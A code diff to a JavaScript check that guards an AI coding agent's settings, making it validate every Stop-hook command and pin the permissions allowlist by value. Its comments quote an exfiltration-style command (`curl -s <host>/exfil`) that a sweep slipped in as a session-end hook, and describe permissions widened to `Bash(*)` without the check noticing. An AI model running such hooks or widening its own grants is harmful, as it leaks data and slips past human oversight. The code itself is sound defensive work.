@@ -238,23 +238,92 @@ ok(
   `${stopCommands.length} Stop command(s) found`,
 );
 
-const stopCommand = stopCommands[0] ?? "";
+/**
+ * EXACTLY ONE Stop command today, tripwired.
+ *
+ * The pre-audit sweep appended a second one, `curl -s <host>/exfil`, and this
+ * gate reported 22 checks and 0 failures while PRINTING "2 Stop command(s)".
+ * Only `stopCommands[0]` was validated, so everything after the first was
+ * unexamined: an arbitrary command running at the end of every session, in a
+ * file this gate exists to police. A count tripwire plus a loop, not an index.
+ */
+const EXPECTED_STOP_COMMANDS = 1;
 
 ok(
-  `the Stop hook invokes the repo's own ${TYPECHECK_SCRIPT} script`,
-  new RegExp(`npm\\s+run\\s+(?:-s\\s+)?${TYPECHECK_SCRIPT}\\b`).test(stopCommand),
-  `its command is ${JSON.stringify(stopCommand)}. It must run ` +
-    `\`npm run -s ${TYPECHECK_SCRIPT}\` so that package.json stays the one place ` +
-    `that defines what a typecheck is.`,
+  `Stop declares exactly ${EXPECTED_STOP_COMMANDS} command`,
+  stopCommands.length === EXPECTED_STOP_COMMANDS,
+  `found ${stopCommands.length}: ${stopCommands.map((/** @type {string} */ c) => JSON.stringify(c)).join(", ")}. ` +
+    `An added Stop command is not automatically wrong, but it runs at the end of ` +
+    `every session and wants a line in this gate before it wants a line in settings.`,
 );
 
-for (const fragment of fragments) {
+// EVERY command, not the first. The loop is the fix; the index was the defect.
+stopCommands.forEach((/** @type {string} */ command, /** @type {number} */ i) => {
+  const label = stopCommands.length > 1 ? `Stop command ${i + 1}` : "the Stop hook";
   ok(
-    `the Stop hook does not restate the ${TYPECHECK_SCRIPT} fragment: ${fragment}`,
-    !stopCommand.includes(fragment),
-    `the Stop command ${JSON.stringify(stopCommand)} contains ${JSON.stringify(fragment)} ` +
-      `verbatim. That is a MIRROR of package.json, and mirrors drift: this one ran ` +
-      `only the last fragment and typechecked against stale generated types.`,
+    `${label} invokes the repo's own ${TYPECHECK_SCRIPT} script`,
+    new RegExp(`npm\\s+run\\s+(?:-s\\s+)?${TYPECHECK_SCRIPT}\\b`).test(command),
+    `its command is ${JSON.stringify(command)}. It must run ` +
+      `\`npm run -s ${TYPECHECK_SCRIPT}\` so that package.json stays the one place ` +
+      `that defines what a typecheck is.`,
+  );
+  for (const fragment of fragments) {
+    ok(
+      `${label} does not restate the ${TYPECHECK_SCRIPT} fragment: ${fragment}`,
+      !command.includes(fragment),
+      `${JSON.stringify(command)} contains ${JSON.stringify(fragment)} verbatim. That is ` +
+        `a MIRROR of package.json, and mirrors drift: this one ran only the last ` +
+        `fragment and typechecked against stale generated types.`,
+    );
+  }
+});
+
+/* ----------------------------------------- the permission allowlist, by value */
+
+/**
+ * The committed allowlist, asserted BY VALUE in both directions.
+ *
+ * Not derivable from anything: it IS the contract. The sweep widened it to
+ * `Bash(*)` and this gate reported 22 checks and 0 failures, because it never
+ * looked at `permissions` at all. `Bash(*)` is every command this agent can run
+ * without being asked, which is a larger grant than every hook here withholds.
+ *
+ * Both directions: an ADDED entry is an unreviewed grant, and a REMOVED one
+ * means the file no longer says what this gate thinks it says.
+ */
+const EXPECTED_ALLOW = [
+  "Bash(git:*)",
+  "Bash(gh:*)",
+  "Bash(npm:*)",
+  "Bash(npx:*)",
+  "Bash(wrangler:*)",
+  "Bash(npx wrangler:*)",
+];
+
+const allow = settings.permissions?.allow ?? [];
+
+ok(
+  "permissions.allow is a non-empty list",
+  Array.isArray(allow) && allow.length > 0,
+  `got ${JSON.stringify(allow)}; an empty or missing list would make both sweeps below ` +
+    `pass by comparing nothing`,
+);
+
+for (const entry of EXPECTED_ALLOW) {
+  ok(
+    `permissions.allow still grants ${entry}`,
+    allow.includes(entry),
+    `it is missing. If the grant was withdrawn deliberately, remove it from ` +
+      `EXPECTED_ALLOW in the same commit.`,
+  );
+}
+for (const entry of allow) {
+  ok(
+    `permissions.allow grants only reviewed entries: ${entry}`,
+    EXPECTED_ALLOW.includes(String(entry)),
+    `${JSON.stringify(entry)} is granted in settings but is not in this gate's reviewed ` +
+      `list. Every widening is a decision; add it here with the same commit that adds it ` +
+      `there, or remove it from settings.`,
   );
 }
 
